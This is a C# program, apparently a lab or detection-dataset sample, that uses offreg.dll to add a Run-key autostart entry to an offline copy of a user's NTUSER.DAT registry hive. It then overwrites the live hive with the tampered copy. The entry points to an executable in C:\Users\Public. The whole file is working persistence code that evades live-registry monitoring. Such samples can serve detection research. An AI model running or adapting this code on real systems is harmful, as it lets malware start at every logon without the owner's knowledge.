using System;
using System.Runtime.InteropServices;

namespace RegistryOfflinePersistence
{
    class Program
    {
        // --- P/Invoke Definitions for offreg.dll ---
        private const string OffRegDll = "offreg.dll";

        // Constants
        private const uint REG_SZ = 1;
        private const uint ERROR_SUCCESS = 0;

        [DllImport(OffRegDll, CharSet = CharSet.Unicode, EntryPoint = "OROpenHive", CallingConvention = CallingConvention.Winapi)]
        private static extern uint OROpenHive(
            string lpszFilePath,
            out IntPtr phkResult
        );

        [DllImport(OffRegDll, CharSet = CharSet.Unicode, EntryPoint = "ORCreateKey", CallingConvention = CallingConvention.Winapi)]
        private static extern uint ORCreateKey(
            IntPtr hKey,
            string lpSubKey,
            string lpClass,
            uint dwOptions,
            IntPtr pSecurityDescriptor,
            out IntPtr phkResult,
            out uint pdwDisposition
        );

        [DllImport(OffRegDll, CharSet = CharSet.Unicode, EntryPoint = "ORSetValue", CallingConvention = CallingConvention.Winapi)]
        private static extern uint ORSetValue(
            IntPtr hKey,
            string lpValueName,
            uint dwType,
            byte[] lpData,
            uint cbData
        );

        [DllImport(OffRegDll, CharSet = CharSet.Unicode, EntryPoint = "ORSaveHive", CallingConvention = CallingConvention.Winapi)]
        private static extern uint ORSaveHive(
            IntPtr hKey,
            string lpszFilePath,
            uint dwOsMajorVersion,
            uint dwOsMinorVersion
        );

        [DllImport(OffRegDll, EntryPoint = "ORCloseKey", CallingConvention = CallingConvention.Winapi)]
        private static extern uint ORCloseKey(IntPtr hKey);

        static int Main(string[] args)
        {
            // 1. Define paths for the staging file and the ultimate live profile target
            string stagingHivePath = @"C:\Users\Public\NTUSER.DAT";
            string liveHivePath = @"C:\Users\LabTestUser\NTUSER.DAT";

            string runKeyName = "Dataset_A06_1b_OfflineHiveSaveRestore_Persistence";
            string payloadCommand = @"C:\Users\Public\A06_1b_persistence_marker.exe";
            string runKeySubPath = @"Software\Microsoft\Windows\CurrentVersion\Run";

            Console.WriteLine("[*] Initializing offline hive manipulation via offreg.dll...");

            IntPtr hRootKey = IntPtr.Zero;
            IntPtr hRunKey = IntPtr.Zero;

            try
            {
                // 2. Open the staging hive file from disk
                uint result = OROpenHive(stagingHivePath, out hRootKey);
                if (result != ERROR_SUCCESS)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] OROpenHive failed. Error code: {result}");
                    Console.ResetColor();
                    return 1;
                }

                // 3. Open or create the run key path inside the offline hive
                uint dwDisposition;
                result = ORCreateKey(hRootKey, runKeySubPath, string.Empty, 0, IntPtr.Zero, out hRunKey, out dwDisposition);
                if (result != ERROR_SUCCESS)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] ORCreateKey failed with error code: {result}");
                    Console.ResetColor();
                    return 1;
                }

                // 4. Prepare and inject the string data
                byte[] commandBytes = System.Text.Encoding.Unicode.GetBytes(payloadCommand + "\0");
                uint cbData = (uint)commandBytes.Length;

                result = ORSetValue(hRunKey, runKeyName, REG_SZ, commandBytes, cbData);
                if (result != ERROR_SUCCESS)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] ORSetValue failed with error code: {result}");
                    Console.ResetColor();
                    return 1;
                }

                // 5. Serialize and save the changes back into the staging binary file
                result = ORSaveHive(hRootKey, stagingHivePath, 6, 2);
                if (result != ERROR_SUCCESS)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] ORSaveHive failed with error code: {result}");
                    Console.ResetColor();
                    return 1;
                }

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[+] Successfully modified staging hive at: {stagingHivePath}");
                Console.ResetColor();

                // 6. Mandatory Unmanaged Resource Cleanup BEFORE moving the file
                // The offreg.dll handles must be closed completely, or Windows will throw a file-lock exception.
                if (hRunKey != IntPtr.Zero) { ORCloseKey(hRunKey); hRunKey = IntPtr.Zero; }
                if (hRootKey != IntPtr.Zero) { ORCloseKey(hRootKey); hRootKey = IntPtr.Zero; }

                // 7. Automated Live Hive Replacement Block
                Console.WriteLine("[*] Attempting automated replacement of the live user hive...");
                if (System.IO.File.Exists(liveHivePath))
                {
                    // Remove System/Hidden attributes on the target live file if they block direct overwriting
                    System.IO.FileInfo targetFileInfo = new System.IO.FileInfo(liveHivePath);
                    targetFileInfo.Attributes = System.IO.FileAttributes.Normal;

                    // Overwrite the live NTUSER.DAT with our modified staging copy
                    System.IO.File.Copy(stagingHivePath, liveHivePath, overwrite: true);

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[+] Success! Replaced live profile hive at: {liveHivePath}");
                    Console.ResetColor();
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"[-] Target live path not found: {liveHivePath}. Ensure the user profile exists.");
                    Console.ResetColor();
                }

                return 0;
            }
            catch (System.IO.IOException ioEx)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[-] File system error: {ioEx.Message}");
                Console.WriteLine("[*] Ensure that 'LabTestUser' is completely logged off so NTUSER.DAT is unlocked.");
                Console.ResetColor();
                return 1;
            }
            catch (DllNotFoundException)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Critical Error: offreg.dll could not be found.");
                Console.ResetColor();
                return 1;
            }
            finally
            {
                // Final safety cleanup pass
                if (hRunKey != IntPtr.Zero) { ORCloseKey(hRunKey); }
                if (hRootKey != IntPtr.Zero) { ORCloseKey(hRootKey); }
            }
        }
    }
}